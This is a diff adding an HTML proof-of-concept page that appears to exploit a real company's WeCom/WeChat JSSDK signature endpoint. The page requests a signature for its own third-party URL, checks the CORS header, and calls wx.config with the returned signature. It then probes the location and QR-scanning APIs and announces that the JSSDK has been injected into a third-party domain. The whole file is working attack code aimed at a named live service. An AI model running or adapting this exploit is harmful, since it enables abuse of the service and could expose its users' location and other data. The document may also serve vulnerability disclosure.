@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>PoC</title>
+<script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
+</head>
+<body>
+<pre id="out">Loading...</pre>
+<script>
+fetch('https://srop-wecom.sheincorp.cn/open/wechat/getJsSdkConfig',{
+  method:'POST',
+  headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({uri:location.href})
+}).then(r=>{
+  console.log('CORS Allow-Origin:',r.headers.get('access-control-allow-origin'))
+  return r.json()
+}).then(data=>{
+  document.getElementById('out').textContent='签名响应:\n'+JSON.stringify(data,null,2)
+  if(data.code!=='0'){return}
+  const c=data.info
+  wx.config({beta:true,debug:true,appId:c.cropId,agentId:c.agentId,
+    timestamp:c.timestamp,nonceStr:c.nonceStr,signature:c.signature,
+    jsApiList:['getLocation','checkJsApi','scanQRCode']})
+  wx.ready(()=>{
+    document.getElementById('out').textContent+= '\n\n✅ wx.ready() 成功！\nJSSDK已注入第三方域名\nAgentID:'+c.agentId
+    wx.checkJsApi({jsApiList:['getLocation','scanQRCode'],
+      success:r=>document.getElementById('out').textContent+='\n\ncheckJsApi:\n'+JSON.stringify(r,null,2)})
+  })
+  wx.error(e=>document.getElementById('out').textContent+='\n\n❌ wx.error:\n'+JSON.stringify(e,null,2))
+}).catch(e=>document.getElementById('out').textContent='❌ CORS blocked: '+e.message)
+</script>
+</body>
+</html>
